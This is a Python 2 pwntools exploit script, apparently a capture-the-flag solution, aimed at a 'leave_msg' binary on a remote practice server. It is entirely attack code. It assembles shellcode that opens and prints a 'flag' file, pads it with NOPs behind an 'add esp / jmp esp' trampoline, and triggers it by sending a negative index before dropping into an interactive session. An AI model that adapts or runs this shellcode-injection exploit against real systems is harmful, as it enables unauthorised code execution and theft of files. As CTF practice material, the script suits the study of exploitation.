#!/usr/bin/env python2

from pwn import *
import pwnlib.elf
import pwnlib.shellcraft
context.log_level = 'debug'
context.arch = 'i386'

#init
e = ELF('./leave_msg')
p = process('./leave_msg')
p = remote('hackme.inndy.tw', 7715)
#libc = ELF('./libc-2.23.so.i386')

log.info('puts@GOT at : {}'.format(hex(e.got['puts'])))
log.info('puts@PLT at : {}'.format(hex(e.plt['puts'])))
print p.recvline()
#exploit
shellcode = shellcraft.pushstr('flag')
shellcode += shellcraft.linux.syscall('SYS_open', 'esp')
shellcode += shellcraft.linux.syscall('SYS_read', 'eax', 'esp', 0x50)
shellcode += shellcraft.linux.syscall('SYS_write', 1, 'esp', 0x50)
payload = asm('add esp, 0x50')
payload += asm('jmp esp')
payload += '\x00'
payload += asm('nop')*87
payload += asm(shellcode)
p.send(payload)
p.send('\x20' + '-16')

p.interactive()
p.close()

